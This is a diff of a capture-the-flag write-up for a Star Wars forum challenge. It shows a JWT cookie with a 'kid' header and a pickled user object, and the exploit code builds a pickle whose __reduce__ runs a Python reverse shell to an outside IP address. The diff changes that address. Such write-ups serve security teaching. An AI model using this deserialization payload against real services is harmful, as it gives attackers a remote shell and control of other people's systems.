@@ -1,5 +1,31 @@
 # B'omarr Style
 
+## Description
+
+Web forum about star wars.
+Users can read papers.
+Papers created by Admin.
+Users are able to signup and signin.
+
+After singin the got cookie `token`:
+```
+token=eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiIsICJraWQiOiAic2VjcmV0LnR4dCJ9.gANjbWFpbgpVc2VyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAGphY2txBFgEAAAAcm9sZXEFWAQAAAB1c2VycQZ1Yi4.SnQXObi662Qa84FJuMRoFePCCyxmdRHD9NiztjiBl_w
+```
+
+The JWT headers:
+```
+{"typ": "JWT", "alg": "HS256", "kid": "secret.txt"}
+```
+
+Body (python pickle serialization):
+```
+00000000  80 03 63 6d 61 69 6e 0a 55 73 65 72 0a 71 00 29  |..cmain.User.q.)|
+00000010  81 71 01 7d 71 02 28 58 08 00 00 00 75 73 65 72  |.q.}q.(X....user|
+00000020  6e 61 6d 65 71 03 58 04 00 00 00 6a 61 63 6b 71  |nameq.X....jackq|
+00000030  04 58 04 00 00 00 72 6f 6c 65 71 05 58 04 00 00  |.X....roleq.X...|
+00000040  00 75 73 65 72 71 06 75 62 2e                    |.userq.ub.|
+```
+
 Server's code (wasn't accessible until the exploit):
 
 ```python
@@ -206,7 +232,7 @@ from jose import jws
 
 class exp(object):
     def __reduce__(self):
-        s = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("185.186.247.40",41337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """
+        s = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",41337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'   """
         return (os.system, (s,))
 
 e = exp()
